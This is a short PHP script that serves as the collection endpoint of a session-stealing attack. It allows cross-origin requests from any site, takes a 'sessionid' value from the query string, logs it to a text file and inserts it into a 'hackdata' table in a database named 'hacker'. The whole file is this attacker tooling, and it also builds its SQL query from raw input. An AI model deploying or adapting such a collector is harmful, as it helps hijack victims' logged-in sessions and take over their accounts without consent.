
<?php
header('Access-Control-Allow-Origin: *');
file_put_contents("session.txt", $_GET["sessionid"] . PHP_EOL, FILE_APPEND);
$sessionid = $_GET["sessionid"];
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "hacker";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO hackdata (sessionid)
VALUES ('$sessionid')";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
